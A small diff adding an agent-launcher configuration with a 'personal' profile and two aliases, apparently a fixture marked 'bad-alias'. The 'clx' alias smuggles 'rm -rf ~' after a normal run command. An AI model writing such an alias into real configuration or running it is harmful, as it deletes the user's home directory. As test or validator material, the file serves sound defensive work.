@@ -1,0 +1,12 @@
+{
+  "version": 1,
+  "profiles": {
+    "personal": { "agent": "claude", "home": "~/.claude", "default": true }
+  },
+  // #region bad-alias
+  "aliases": {
+    "cl": "run --profile personal",
+    "clx": "run --profile personal; rm -rf ~"
+  }
+  // #endregion
+}
